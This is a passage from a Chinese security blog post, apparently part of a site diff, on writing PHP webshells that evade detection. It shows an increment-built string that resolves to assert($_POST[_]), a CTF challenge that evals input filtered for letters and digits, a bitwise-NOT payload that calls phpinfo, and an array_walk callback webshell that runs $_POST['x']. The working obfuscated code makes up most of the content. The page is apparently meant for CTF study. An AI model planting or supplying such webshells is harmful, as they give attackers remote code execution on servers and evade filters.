style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>; <span style="color:#6272a4">// R
+</span><span style="color:#6272a4"></span><span style="color:#8be9fd;font-style:italic">$___</span><span style="color:#ff79c6">.=</span><span style="color:#8be9fd;font-style:italic">$__</span>;
+<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">=</span><span style="color:#8be9fd;font-style:italic">$_</span>;
+<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>; <span style="color:#6272a4">// T
+</span><span style="color:#6272a4"></span><span style="color:#8be9fd;font-style:italic">$___</span><span style="color:#ff79c6">.=</span><span style="color:#8be9fd;font-style:italic">$__</span>;
+
+<span style="color:#8be9fd;font-style:italic">$____</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;_&#39;</span>;
+<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">=</span><span style="color:#8be9fd;font-style:italic">$_</span>;
+<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>; <span style="color:#6272a4">// P
+</span><span style="color:#6272a4"></span><span style="color:#8be9fd;font-style:italic">$____</span><span style="color:#ff79c6">.=</span><span style="color:#8be9fd;font-style:italic">$__</span>;
+<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">=</span><span style="color:#8be9fd;font-style:italic">$_</span>;
+<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>; <span style="color:#6272a4">// O
+</span><span style="color:#6272a4"></span><span style="color:#8be9fd;font-style:italic">$____</span><span style="color:#ff79c6">.=</span><span style="color:#8be9fd;font-style:italic">$__</span>;
+<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">=</span><span style="color:#8be9fd;font-style:italic">$_</span>;
+<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>; <span style="color:#6272a4">// S
+</span><span style="color:#6272a4"></span><span style="color:#8be9fd;font-style:italic">$____</span><span style="color:#ff79c6">.=</span><span style="color:#8be9fd;font-style:italic">$__</span>;
+<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">=</span><span style="color:#8be9fd;font-style:italic">$_</span>;
+<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>; <span style="color:#6272a4">// T
+</span><span style="color:#6272a4"></span><span style="color:#8be9fd;font-style:italic">$____</span><span style="color:#ff79c6">.=</span><span style="color:#8be9fd;font-style:italic">$__</span>;
+
+<span style="color:#8be9fd;font-style:italic">$_</span><span style="color:#ff79c6">=</span><span style="color:#8be9fd;font-style:italic">$$____</span>;
+<span style="color:#8be9fd;font-style:italic">$___</span>(<span style="color:#8be9fd;font-style:italic">$_</span>[_]); <span style="color:#6272a4">// ASSERT($_POST[_]);
+</span></code></pre></div><h2 id="php7动态函数">php7动态函数</h2>
+<p>看来已经不足以阻挡了.加点难度</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#ff79c6">&lt;?</span>php
+<span style="color:#ff79c6">if</span>(isset(<span style="color:#8be9fd;font-style:italic">$_GET</span>[<span style="color:#f1fa8c">&#39;code&#39;</span>])){
+    <span style="color:#8be9fd;font-style:italic">$code</span> <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">$_GET</span>[<span style="color:#f1fa8c">&#39;code&#39;</span>];
+    <span style="color:#ff79c6">if</span>(strlen(<span style="color:#8be9fd;font-style:italic">$code</span>)<span style="color:#ff79c6">&gt;</span><span style="color:#bd93f9">35</span>){
+        <span style="color:#ff79c6">die</span>(<span style="color:#f1fa8c">&#34;Long.&#34;</span>);
+    }
+    <span style="color:#ff79c6">if</span>(preg_match(<span style="color:#f1fa8c">&#34;/[A-Za-z0-9_$]+/&#34;</span>,<span style="color:#8be9fd;font-style:italic">$code</span>)){
+        <span style="color:#ff79c6">die</span>(<span style="color:#f1fa8c">&#34;NO.&#34;</span>);
+    }
+    <span style="color:#ff79c6">eval</span>(<span style="color:#8be9fd;font-style:italic">$code</span>);
+}<span style="color:#ff79c6">else</span>{
+    highlight_file(__FILE__);
+}
+</code></pre></div><p>pass it!</p>
+<p>PHP7前是不允许用<code>($a)();</code>这样的方法来执行动态函数的，但PHP7中增加了对此的支持。所以，我们可以通过<code>('phpinfo')();</code>来执行函数，第一个括号中可以是任意PHP表达式。</p>
+<p><figure 
+	>
+	<a href="https://pic.imgdb.cn/item/617a3bb22ab3f51d91c05a77.png#alt=" >
+		<img src="https://pic.imgdb.cn/item/617a3bb22ab3f51d91c05a77.png#alt="
+			
+			
+			
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>最后,利用之前的取反,得到答案(phpinfo)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">(~%8F%97%8F%96%91%99%90)();
+</code></pre></div><p>(上面url表示的都是abcd&hellip;之外的不可见字符)</p>
+<h2 id="回调函数">回调函数</h2>
+<p>回调函数的运用在一段时间里曾被webshell广泛应用。</p>
+<p>首先，我们需要知道什么是回调函数，回调是什么意思？</p>
+<p>所谓是回调其实就是间接调用，当PHP调用用户自定义的函数时，必须要通过一个代理函数来进行调用，所以称为回调函数。</p>
+<h4 id="array_walk">array_walk()</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">array_walk(<span style="color:#ff79c6">array</span>,myfunction,parameter<span style="color:#ff79c6">...</span>)
+</code></pre></div><div class="table-wrapper"><table>
+<thead>
+<tr>
+<th style="text-align:left">参数</th>
+<th style="text-align:left">描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left"><em>array</em></td>
+<td style="text-align:left">必需。规定数组。</td>
+</tr>
+<tr>
+<td style="text-align:left"><em>myfunction</em></td>
+<td style="text-align:left">必需。用户自定义函数的名称。</td>
+</tr>
+<tr>
+<td style="text-align:left"><em>userdata</em>,…</td>
+<td style="text-align:left">可选。规定用户自定义函数的参数。您能够向此函数传递任意多参数。</td>
+</tr>
+</tbody>
+</table></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#ff79c6">&lt;?</span>php
+    <span style="color:#ff79c6">function</span> <span style="color:#50fa7b">Ameng</span>(<span style="color:#8be9fd;font-style:italic">$value</span>,<span style="color:#8be9fd;font-style:italic">$key</span>){   
+        <span style="color:#8be9fd;font-style:italic">$a</span> <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">$key</span><span style="color:#ff79c6">.</span><span style="color:#8be9fd;font-style:italic">$value</span>;	<span style="color:#6272a4">//拼接
+</span><span style="color:#6272a4"></span>        <span style="color:#8be9fd;font-style:italic">$a</span>(<span style="color:#8be9fd;font-style:italic">$_POST</span>[<span style="color:#f1fa8c">&#39;x&#39;</span>]);
+    }
+    <span style="color:#8be9fd;font-style:italic">$b</span><span style="color:#ff79c6">=</span><span style="color:#ff79c6">array</span>(<span style="color:#f1fa8c">&#34;ass&#34;</span><span style="color:#ff79c6">=&gt;</span><span style="color:#f1fa8c">&#34;ert&#34;</span>);	<span style="color:#6272a4">//$value=ert,$key=ass
+</span><span style="color:#6272a4"></span>    array_walk(<span style="color:#8be9fd;font-style:italic">$b</span>,<span style="color:#f1fa8c">&#34;Ameng&#34;</span>);	<span style="color:#6272a4">//调用自己定义函数，并传入键值对
+</span><span style="color:#6272a4"></span><span style="color:#ff79c6">?&gt;</span>
+</code></pre></div><p>参考:</p>
+<p><a class="link" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html"  target="_blank" rel="noopener"
+    >一些不包含数字和字母的webshell</a></p>
+<p><a class="link" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html"  target="_blank" rel="noopener"
+    >无字母数字webshell之提高篇</a></p>
+<p><a class="link" href="https://www.icode9.com/content-3-827439.html"  target="_blank" rel="noopener"
+    >php webshell各种姿势总结 - ICode9</a></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/php/">php</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    <aside class="related-contents--wrapper">
+    
+    
+        <h2 class="section-title">Related contents</h2>
+        <div class="related-contents">
+            <div class="flex article-list--tile">
+                
+                    
+<article class="">
+    <a href="/2022/lnmp%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E6%88%90%E5%8A%9F%E7%AF%87/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">LNMP环境搭建成功篇</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="">
+    <a href="/2022/lnmp%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%A4%B1%E8%B4%A5%E7%AF%87/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">LNMP环境搭建失败篇</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="">
+    <a href="/2022/%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%9D%A2%E8%AF%95%E7%BB%8F%E5%8E%86/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">第一次面试经历</h2>
+        </div>
+    </a>
+</article>
+                
+            </div>
+        </div>
+    
+</aside>
+
+     
+    
+
+    <footer class="site-footer">
+  
+
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+
+<script>
+(function(u, c) {
+  var d = document, t = 'script', o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+  o.src = u;
+  if (c) { o.addEventListener('load', function(e) { c(e); }); }
+  s.parentNode.insertBefore(o, s);
+})('//cdn.bootcss.com/pangu/3.3.0/pangu.min.js', function() {
+  pangu.spacingPage();
+});
+</script>
+
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2022 <a href="https://stack-theme-mod.vercel.app/">茄子的养殖场</a>·<i class="fas fa-bell"></i> <a id="days">0</a>Days<br>
+      共书写了30.4k字·共 20篇文章</br><span><p>
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.2.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a><br />
+         <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">© Licensed Under CC BY-NC-SA 4.0</a>
+    </section>
+
+<script>
+var s1 = '2022-02-12';
+s1 = new Date(s1.replace(/-/g, "/"));
+s2 = new Date();
+var days = s2.getTime() - s1.getTime();
+var number_of_days = parseInt(days / (1000 * 60 * 60 * 24));
+document.getElementById('days').innerHTML = number_of_days;
+</script>
+    
+</footer>
+
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+
+            </main>
+    
+    
+    
+    <aside class="sidebar right-sidebar sticky">
+        
+            <form action="/search/" class="search-form widget" >
+        <p>
+            <label>Search</label>
+            <input name="keyword" required placeholder="Type something..." />
+        
+            <button title="Search">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+            </button>
+        </p>
+    </form>
+        
+            
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#异或">异或</a></li>
+    <li><a href="#取反">取反</a></li>
+    <li><a href="#递增递减">递增／递减</a></li>
+    <li><a href="#php7动态函数">php7动态函数</a></li>
+    <li><a href="#回调函数">回调函数</a>
+      <ol>
+        <li>
+          <ol>
+            <li><a href="#array_walk">array_walk()</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+        
+            <section class="widget categories">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-infinity" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M9.828 9.172a4 4 0 1 0 0 5.656 a10 10 0 0 0 2.172 -2.828a10 10 0 0 1 2.172 -2.828 a4 4 0 1 1 0 5.656a10 10 0 0 1 -2.172 -2.828a10 10 0 0 0 -2.172 -2.828" />
+</svg>
+
+
+  
+        </div> 
+        <h2 class="widget-title section-title">Categories</h2>
+    <div class="widget-categories--list">
+<div class="widget">
+    <h3 class="widget-title"> </h3>
+    <div class="widget-body">
+        <div class="category-list">
+            <div class="category-list-item"><a href="https://proben1.github.io/categories/%E5%B0%8F%E4%BA%BA%E8%81%94%E5%90%88%E5%B7%A5%E4%BC%9A/" class="category-list-link">小人联合工会<span class="category-list-count">1</a>
+            </span></div>
+            <div class="category-list-item"><a href="https://proben1.github.io/categories/%E6%95%B4%E7%82%B9%E5%B0%8F%E6%B4%BB/" class="category-list-link">整点小活<span class="category-list-count">6</a>
+            </span></div>
+            <div class="category-list-item"><a href="https://proben1.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="category-list-link">网络安全<span class="category-list-count">13</a>
+            </span></div>
+        </div>
+    </div>
+</div>
+    </div>
+    </section>
+        
+            <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-infinity" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M9.828 9.172a4 4 0 1 0 0 5.656 a10 10 0 0 0 2.172 -2.828a10 10 0 0 1 2.172 -2.828 a4 4 0 1 1 0 5.656a10 10 0 0 1 -2.172 -2.828a10 10 0 0 0 -2.172 -2.828" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Archives</h2>
+
+        
+        
+        
+        
+        
+        <div class="widget-archive--list">
+            <div class="archives-year">
+                    <a href="/archives/#2022">
+                        
+                            <span class="year">2022</span>
+                            <span class="count">11</span>
+                        
+                    </a> 
+                </div>
+            <div class="archives-year">
+                    <a href="/archives/#2021">
+                        
+                            <span class="year">2021</span>
+                            <span class="count">9</span>
+                        
+                    </a> 
+                </div>
+            
+        </div>
+    </section>
+        
+            <section class="widget tagCloud">
+    <div class="widget-icon">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-tag" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11 3L20 12a1.5 1.5 0 0 1 0 2L14 20a1.5 1.5 0 0 1 -2 0L3 11v-4a4 4 0 0 1 4 -4h4" />
+  <circle cx="9" cy="9" r="2" />
+</svg>
+
+
+
+    </div>
+    <h2 class="widget-title section-title">Tags</h2>
+
+    <div class="tagCloud-tags">
+        
+            <a href="/tags/sql%E6%B3%A8%E5%85%A5/" class="font_size_3">
+                SQL注入
+            </a>
+        
+            <a href="/tags/php/" class="font_size_2">
+                php
+            </a>
+        
+            <a href="/tags/python/" class="font_size_2">
+                python
+            </a>
+        
+            <a href="/tags/docker/" class="font_size_1">
+                Docker
+            </a>
+        
+            <a href="/tags/git/" class="font_size_1">
+                git
+            </a>
+        
+            <a href="/tags/js/" class="font_size_1">
+                js
+            </a>
+        
+            <a href="/tags/sql/" class="font_size_1">
+                SQL
+            </a>
+        
+            <a href="/tags/thinkphp/" class="font_size_1">
+                thinkphp
+            </a>
+        
+            <a href="/tags/windows/" class="font_size_1">
+                Windows
+            </a>
+        
+            <a href="/tags/xss/" class="font_size_1">
+                xss
+            </a>
+        
+    </div>
+</section>
+        
+    </aside>
+
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
